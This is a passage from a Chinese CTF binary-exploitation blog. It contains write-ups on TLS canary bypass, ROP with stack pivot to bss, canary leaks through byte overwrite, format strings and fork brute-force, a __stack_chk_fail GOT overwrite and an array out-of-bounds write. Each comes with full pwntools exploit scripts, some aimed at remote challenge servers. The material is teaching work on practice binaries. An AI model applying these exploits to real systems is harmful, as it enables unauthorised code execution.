class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/13/canary-tls/3.png"></p><p>问题2：要想找到one_gadget，得先知道libc_base，所以这里需要泄漏puts的got表项内容，但是我们只有一次输入，所以我们得构造一条ROP链先泄漏出libc，然后在向bss段读取one_gadget，最后栈迁移过去执行one_gadget。</p><p>最终exp：(远程，本地都没通，用官方exp也没同，可能是libc的问题，但是我的glibc-all-in-one出了些问题，搞了很久，不想搞了)</p><p>总结一波：</p><ul><li>针对多线程，我们可以修改TLS的canary，从而绕过canary（前提是溢出长度足够大。</li><li>对于栈迁移，在有read函数的情况下，可以利用栈迁移到bss段，一般是bss+0x300的位置开始写。如果可以泄漏栈地址，就可以直接写到栈中，然后ebp写esp的地址，leave就会跳到esp去执行我们写入的东西。</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token triple-quoted-string string">"""offset = 0x1020 + 8count = 1while True:    print count    io = process('./bs')    io.recvuntil("How many bytes do you want to send?")    io.sendline(str(offset))    ret_addr = 0x4009E7    payload  = 'a'*0x1010    payload += p64(0xdeadbeef)    payload += p64(ret_addr)    payload += 'a'*(offset-len(payload))    io.send(payload)    temp = io.recvall()    if "Welcome" in temp:        io.close()        break    else:        offset += 8        count += 1        io.close()"""</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> <span class="token number">6128</span>    <span class="token comment">#io = process('./bs')</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26773</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc    fakerbp <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x300</span>    ret_addr <span class="token operator">=</span> <span class="token number">0x4009E7</span>    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400C03</span>    pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400C01</span>    leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>    payload  <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1010</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fakerbp<span class="token punctuation">)</span>    <span class="token comment">#leak libc</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#read one_gadget to bss</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fakerbp<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>    payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"It's time to say goodbye.\n"</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>    getshell_libc <span class="token operator">=</span> <span class="token number">0xf03a4</span>    base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libc    one_gadget <span class="token operator">=</span> base_addr <span class="token operator">+</span> getshell_libc    payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> syselfPath <span class="token operator">=</span> <span class="token string">"./bs"</span>libcPath <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>remoteAddr <span class="token operator">=</span> <span class="token string">"47.100.96.94"</span>remotePort <span class="token operator">=</span> <span class="token number">9999</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfPathelf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span>elfPath<span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"d"</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span>elfPath<span class="token punctuation">,</span> env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span> libcPath<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteAddr<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>    <span class="token keyword">if</span> libcPath<span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libcPath<span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"deepin-terminal"</span><span class="token punctuation">,</span> <span class="token string">"-x"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">]</span>success <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span> value<span class="token punctuation">:</span> log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"{} -&gt; {:#x}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEBUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"DEBUG: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    0x0000000000400c03 : pop rdi ; ret    0x0000000000400c01 : pop rsi ; pop r15 ; ret    0x0000000000400955 : leave ; ret    '''</span>    prdi <span class="token operator">=</span> <span class="token number">0x0000000000400c03</span>    prsip <span class="token operator">=</span> <span class="token number">0x0000000000400c01</span>    leaveret <span class="token operator">=</span> <span class="token number">0x0000000000400955</span>    libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'one_gadget'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xf1147</span>    base <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'\0'</span> <span class="token operator">*</span> <span class="token number">0x1010</span><span class="token punctuation">,</span> base <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">,</span> prdi<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>prdi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> prsip<span class="token punctuation">,</span> base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"send?\n"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\0\0'</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    success<span class="token punctuation">(</span><span class="token string">"libc"</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'one_gadget'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：</p><p><a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">New bypass and protection techniques for ASLR on Linux</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TLS </tag>
            
            <tag> thread stack </tag>
            
            <tag> Canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary攻击解题篇</title>
      <link href="/2023/04/12/canary-jie-ti-pian/"/>
      <url>/2023/04/12/canary-jie-ti-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="babypie"><a href="#babypie" class="headerlink" title="babypie"></a>babypie</h1><p>知识点：</p><ul><li>覆盖canary低字节leak canary</li><li>ASLR/PIE随机化地址高位，低 12 位的页内偏移始终是固定的</li></ul><p>程序开启了Canary、NX和PIE保护</p><p><img src="/2023/04/12/canary-jie-ti-pian/1-0.png"></p><p>程序逻辑：</p><ul><li>在输入输出前，将buf栈空间清0</li><li>两次溢出，第一次溢出后有一次输出</li><li>存在后门函数</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/1-1.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/1-2.png"></p><p>漏洞利用：</p><ul><li>利用第一次溢出leak canary  &lt;=== 把canary低字节覆盖为非0</li><li>利用第二次溢出修改ret_addr  &lt;=== 把ret_addr修改为sub_A3E函数 &lt;=== 爆破</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babypie"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'deadbeef'</span> <span class="token operator">+</span> <span class="token string">'\x3E\x0A'</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> e<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/1-3.png"></p><h1 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h1><p>知识点：</p><ul><li>printf格式化字符串漏洞任意读leak canary</li></ul><p>程序开启了Canary和NX保护</p><p><img src="/2023/04/12/canary-jie-ti-pian/2-0.png"></p><p>程序逻辑：</p><ul><li>在main函数中存在格式化字符串漏洞</li><li>fun函数中存在溢出</li><li>存在getflag后门函数</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/2-1.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/2-2.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/2-3.png"></p><p>漏洞利用：</p><ul><li>利用printf格式化字符串leak canary ==&gt; 找到canary相对于格式化字符串的偏移</li><li>利用溢出覆盖ret_addr为getflag函数地址</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%7$p'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/2-4.png"></p><h1 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h1><p>知识点：</p><ul><li>fork循环创建子进程，canary值相同</li><li>爆破canary</li></ul><p>程序开启Canary和NX保护：没啥好说的，跟之前Canary原理篇例子一模一样</p><p><img src="/2023/04/12/canary-jie-ti-pian/3-0.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/3-1.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin1"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bin1"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"Checking %d for %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'welcome\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"sucess"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/3-2.png"></p><h1 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h1><p>知识点：</p><ul><li>格式化字符串将__stack_chk_fail的got表项内容修改为后门函数</li></ul><p>程序存在格式化字符串漏洞，有后门函数，且只有一次输入输出机会。</p><p>漏洞利用：</p><ul><li>read_n只能读入0x59个字符，刚好溢出到canary</li><li>格式化字符串地址为格式化字符串的第6个参数</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/4-0.png"></p><p>exp：（这里我用fmtstr_payload一直打不通&gt;_&lt;，所以自己手动构造吧</p><blockquote><p>这里我们只需要覆盖低两个字节就行，高字节是相等的</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level='debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin3'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin3'</span><span class="token punctuation">)</span>stack_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token comment">#AAAAA%xx ==&gt; 第6个参数</span><span class="token comment">#xxc%8$hn ==&gt; 第7个参数</span><span class="token comment">#p64(stack_fail) ==&gt; 第8个参数</span>payload <span class="token operator">=</span> <span class="token string">'AAAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'backdoor'</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xFFFF</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_fail<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/4-1.png"></p><h1 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h1><p>知识点：</p><ul><li>数组下标越界(检查不严格)造成“任意地址”写</li></ul><p>程序开启了Canary和NX保护，存在如下漏洞：</p><ul><li>存在后门函数，数组下标检查不严格</li></ul><p>漏洞利用：</p><ul><li>计算出ret_addr相对于数组的下标（14），然后直接把后门函数写入</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/6.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'edit: '</span><span class="token punctuation">,</span> <span class="token string">'14'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'many? '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'call_me_maybe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 